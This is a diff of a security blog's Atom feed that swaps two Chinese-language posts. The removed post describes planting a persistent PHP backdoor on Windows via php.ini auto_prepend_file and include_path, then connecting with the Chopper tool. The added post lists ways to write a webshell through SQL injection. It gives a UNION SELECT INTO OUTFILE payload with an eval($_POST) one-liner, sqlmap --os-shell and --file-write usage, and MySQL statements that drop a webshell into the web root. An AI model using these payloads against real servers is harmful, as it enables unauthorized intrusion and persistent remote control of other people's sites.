@@ -532,29 +532,31 @@
   </entry>
   
   <entry>
-    <title>Windows下的一种PHP隐藏后门姿势</title>
-    <link href="https://Mi1k7ea.github.com/2019/01/01/Windows%E4%B8%8B%E7%9A%84%E4%B8%80%E7%A7%8DPHP%E9%9A%90%E8%94%BD%E5%90%8E%E9%97%A8%E5%A7%BF%E5%8A%BF/"/>
-    <id>https://Mi1k7ea.github.com/2019/01/01/Windows下的一种PHP隐蔽后门姿势/</id>
+    <title>SQL注入写WebShell方式小结</title>
+    <link href="https://Mi1k7ea.github.com/2019/01/01/SQL%E6%B3%A8%E5%85%A5%E5%86%99WebShell%E6%96%B9%E5%BC%8F%E5%B0%8F%E7%BB%93/"/>
+    <id>https://Mi1k7ea.github.com/2019/01/01/SQL注入写WebShell方式小结/</id>
     <published>2018-12-31T17:01:01.000Z</published>
-    <updated>2019-02-24T05:06:57.877Z</updated>
+    <updated>2019-02-24T04:07:44.054Z</updated>
     
-    <content type="html"><![CDATA[<p>在Windows中的PHP解释环境中有两个函数能够自动加载文件，即auto_prepend_file和auto_append_file，其在php.ini中可修改成任意文件，可为PHP或DLL文件。将后门代码写入这两个文件，再修改include_path为后门文件的绝对路径，则Web站点下所有的PHP文件都可以作为PHP后门。</p><p>1、修改auto_prepend_file和auto_append_file：</p><p>在php.ini中找到这两个配置项，去掉注释，添加上后门文件名，如：</p><p><img src="/2019/01/01/Windows下的一种PHP隐蔽后门姿势/1.jpg" alt=""></p><p>2、修改include_path：</p><p>在php.ini中找到该配置项，注意是Windows版本的，去掉注释并添加后门文件所在的绝对路径，如下：</p><p><img src="/2019/01/01/Windows下的一种PHP隐蔽后门姿势/2.jpg" alt=""></p><p>3、创建后门文件：</p><p>在include_path指示的路径上创建auto_prepend_file和auto_append_file指定文件名的两个后门文件，如下：</p><p><img src="/2019/01/01/Windows下的一种PHP隐蔽后门姿势/3.jpg" alt=""></p><p>之后直接使用菜刀带上密码访问Web站点任意一个PHP页面即可获取shell：</p><p><img src="/2019/01/01/Windows下的一种PHP隐蔽后门姿势/4.jpg" alt=""></p>]]></content>
+    <content type="html"><![CDATA[<p>这里小结一下通过SQL注入写入WebShell的方法。</p><p>通过SQL注入select into outfile实现，如：</p><p>1’ union select 1,’\&lt;?php eval($_POST[a]);?&gt;’ INTO OUTFILE ‘/var/www/tmp/nb.php’#</p><p>前提都是需要对目标目录具有写权限。</p><h2 id="–os-cmd-”net-user”"><a href="#–os-cmd-”net-user”" class="headerlink" title="–os-cmd=”net user”"></a>–os-cmd=”net user”</h2><p>交互式命令执行，注意在使用交互式方式时需要知道网站的绝对路径，执行成功之后在绝对路径<br>下创建文件返回结果，然后再自动删除。</p><p>##–os-shell<br>写webshell，会生成两个文件，tmpbshrd.php和tmpucnll.php，分别为命令执行和文件上传webshell。<br>注意:关闭sqlmap文件就会被删除。</p><p>##本地写入webshell<br>先在sqlmap的目录创建mst目录，然后在该目录中创建mst.txt，内容为一句话木马，之后需要两个参数即本地文件地址和目标文件地址，–file-write “./mst/mst.txt” –file-dest “网站的绝对路径/1.php”。</p><p>注意需要最高权限。</p><p>MySQL写木马，通常可以通过phpmyadmin来实现。</p><p>前提条件：有读写的权限，有CREATE、INSERT、SELECT的权限。</p><p>1、创建一个表</p><p>CREATE TABLE a (cmd text NOT NULL);</p><p>2、插入数据</p><p>INSERT INTO a (cmd) VALUES(‘\&lt;?php eval($_POST[‘password’]);?&gt;’);</p><p>3、导出一句话</p><p>SELECT cmd from a into outfile ‘/var/www/tmp/webshell.php’;</p><p>4、删除表</p><p>Drop TABLE IF EXISTS a;</p>]]></content>
     
     <summary type="html">
     
       
       
-        &lt;p&gt;在Windows中的PHP解释环境中有两个函数能够自动加载文件，即auto_prepend_file和auto_append_file，其在php.ini中可修改成任意文件，可为PHP或DLL文件。将后门代码写入这两个文件，再修改include_path为后门文件的绝对路径
+        &lt;p&gt;这里小结一下通过SQL注入写入WebShell的方法。&lt;/p&gt;
+&lt;p&gt;通过SQL注入select into outfile实现，如：&lt;/p&gt;
+&lt;p&gt;1’ union select 1,’\&amp;lt;?php eval($_POST[a]);?&amp;gt;’ INTO OUTFIL
       
     
     </summary>
     
-      <category term="PHP" scheme="https://Mi1k7ea.github.com/categories/PHP/"/>
+      <category term="Web安全基础" scheme="https://Mi1k7ea.github.com/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
     
-    
-      <category term="PHP" scheme="https://Mi1k7ea.github.com/tags/PHP/"/>
     
       <category term="Web安全" scheme="https://Mi1k7ea.github.com/tags/Web%E5%AE%89%E5%85%A8/"/>
+    
+      <category term="SQLI" scheme="https://Mi1k7ea.github.com/tags/SQLI/"/>
     
   </entry>
   
